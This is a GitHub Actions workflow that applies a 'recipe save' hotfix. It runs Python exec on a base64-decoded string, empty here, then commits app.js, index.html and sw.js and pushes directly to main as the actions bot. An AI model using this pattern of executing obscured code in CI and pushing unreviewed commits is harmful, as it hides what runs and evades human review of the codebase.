name: Apply recipe save hotfix

on:
  push:
    paths:
      - '.github/workflows/apply-save-hotfix.yml'

permissions:
  contents: write

jobs:
  hotfix:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Patch recipe save flow
        run: python3 -c "import base64;exec(base64.b64decode(''))"
      - name: Commit hotfix
        run: |
          if git diff --quiet -- app.js index.html sw.js; then exit 0; fi
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add app.js index.html sw.js
          git commit -m '12.5 fix recipe save flow'
          git push origin HEAD:main
